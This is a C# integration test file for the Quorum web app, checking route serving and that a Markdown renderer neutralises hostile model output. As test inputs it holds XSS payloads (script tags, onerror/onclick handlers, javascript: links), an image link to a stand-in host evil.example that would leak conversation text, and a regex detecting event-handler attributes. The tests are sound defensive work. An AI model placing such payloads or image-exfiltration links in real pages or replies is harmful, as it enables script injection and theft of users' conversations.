using System.Net;
using Quorum.Integration.Tests.Fixtures;
using Quorum.Web.Client;

namespace Quorum.Integration.Tests.Web;

public sealed class WebClientTests(PostgresFixture postgres)
{
    private static CancellationToken Ct => TestContext.Current.CancellationToken;

    [Theory]
    [InlineData("/")]
    [InlineData("/login")]
    [InlineData("/c/01a14117-8443-7208-890d-b78925ebb291")]
    public async Task EveryNonApiAddressServesTheWebApplication(string path)
    {
        await using var app = await QuorumApp.StartOnNewDatabaseAsync(postgres);
        using var client = app.CreateClient();

        using var response = await client.GetAsync(new Uri(path, UriKind.Relative), Ct);

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        Assert.Equal("text/html", response.Content.Headers.ContentType?.MediaType);
        Assert.Contains("_framework/blazor.webassembly.js", await response.Content.ReadAsStringAsync(Ct), StringComparison.Ordinal);
    }

    [Fact]
    public async Task TheWebAssemblyRuntimeIsServedByTheHost()
    {
        await using var app = await QuorumApp.StartOnNewDatabaseAsync(postgres);
        using var client = app.CreateClient();

        using var response = await client.GetAsync(new Uri("/_framework/blazor.webassembly.js", UriKind.Relative), Ct);

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
    }

    [Theory]
    [InlineData("# Title {onmouseover=\"alert(1)\"}")]
    [InlineData("[click](https://example.com){onclick=\"alert(1)\"}")]
    [InlineData("<img src=x onerror=alert(1)>")]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("[x](javascript:alert(1))")]
    public void MarkdownFromTheModelCannotInjectScriptsOrMarkup(string markdown)
    {
        var html = MarkdownRenderer.ToHtml(markdown);

        // Text that merely looks like an attribute is fine; what must never appear is a tag carrying one.
        Assert.DoesNotMatch(@"<[^>]*\bon\w+\s*=", html);
        Assert.DoesNotContain("<script", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<img", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("href=\"javascript:", html, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void ImagesAreShownAsLinksSoTheBrowserNeverFetchesThem()
    {
        var html = MarkdownRenderer.ToHtml("![secret](https://evil.example/p.png?q=conversation)");

        Assert.DoesNotContain("<img", html, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("<a href=\"https://evil.example/p.png?q=conversation\"", html, StringComparison.Ordinal);
    }

    [Fact]
    public void OrdinaryMarkdownStillRenders()
    {
        var html = MarkdownRenderer.ToHtml("**bold**\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |");

        Assert.Contains("<strong>bold</strong>", html, StringComparison.Ordinal);
        Assert.Contains("<li>one</li>", html, StringComparison.Ordinal);
        Assert.Contains("<table>", html, StringComparison.Ordinal);
    }
}
